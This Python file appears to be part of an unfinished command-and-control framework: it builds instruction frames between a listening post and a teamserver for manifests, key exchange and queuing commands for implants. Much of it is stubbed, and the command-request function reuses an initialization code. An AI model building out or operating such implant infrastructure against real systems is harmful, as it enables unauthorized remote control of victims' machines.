from lib import instructions


def send_manifest(frame, listener):
    """
    RECEIVES: Request for a manifest, Teamserver pubkey for next transaction
    SENDS: Listening post manifest, LP pubkey use for next transaction
    SETS: TS pubkey, LP keypair

    :param frame:
    :param listener:
    :return:
    """
    # TODO: HIGH_PRI: Make a listener.manifest
    data = {'component_id': listener.component_id, "cmd": "lpm", "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    # TODO: value setting
    reply_frame = instruction_frame  # Debug, will be encoded once cooked
    return reply_frame


def send_initialization(listener):
    """
    RECEIVES: None
    SENDS: Listening post initialization, Listening post pubkey for next transaction
    SETS: LP Keypair, LP State
    :return:
    """
    data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"lpk": listener.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    # TODO: cooking
    reply_frame = instruction_frame  # Debug, will be encoded once cooked
    return reply_frame


def rekey(frame, listener):
    data = {}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = instruction_frame  # Debug, will be encoded once cooked
    return reply_frame


def initialized(frame, listener):
    reply_frame = None
    listener.listening_post.status = "READY"
    return reply_frame


def request_command(listener):
    """
    RECEIVES: None
    SENDS: Implant commands to run, listening post pubkey for next transaction
    SETS: listener.cmd_queue, LP Keypair

    :param listener:
    :return:
    """
    data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"gcmd": listener.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = instruction_frame  # Debug, will be encoded once cooked
    return reply_frame

def receive_command(frame, listener):
    # TODO: add the command to the implant's queue
    reply_frame = {"tid": frame['transaction_id']}
    return reply_frame
